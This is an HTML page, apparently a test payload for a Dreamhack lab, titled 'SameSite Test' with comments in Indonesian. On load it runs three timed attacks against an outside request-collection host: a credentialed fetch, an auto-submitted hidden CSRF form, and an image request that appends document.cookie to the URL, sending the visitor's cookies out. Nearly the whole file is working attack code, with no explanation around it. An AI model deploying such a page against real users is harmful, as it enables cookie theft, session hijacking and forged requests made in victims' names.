<!DOCTYPE html>
<html>
<head>
    <title>SameSite Test</title>
</head>
<body>
    <h2>Testing SameSite Vulnerability</h2>
    
    <!-- Test 1: Form POST -->
    <form id="csrfForm" action="https://foqeblb.request.dreamhack.games/" method="POST">
        <input type="hidden" name="action" value="test_csrf">
        <input type="hidden" name="data" value="exploit_attempt">
    </form>
    
    <!-- Test 2: Auto Fetch -->
    <script>
        console.log("Starting SameSite test...");
        
        // Test 1: Coba kirim request dengan credentials
        setTimeout(() => {
            console.log("Test 1: Fetch with credentials");
            fetch('https://foqeblb.request.dreamhack.games/', {
                method: 'GET',
                credentials: 'include',  // Ini yang penting!
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(response => response.text())
            .then(data => {
                console.log("Fetch successful:", data.length);
            })
            .catch(err => {
                console.log("Fetch error:", err);
            });
        }, 1000);
        
        // Test 2: Auto-submit form
        setTimeout(() => {
            console.log("Test 2: Form submission");
            document.getElementById('csrfForm').submit();
        }, 3000);
        
        // Test 3: Image request
        setTimeout(() => {
            console.log("Test 3: Image request");
            const img = new Image();
            img.src = 'https://foqeblb.request.dreamhack.games/?test=image&cookie=' + document.cookie;
        }, 5000);
    </script>
</body>
</html>
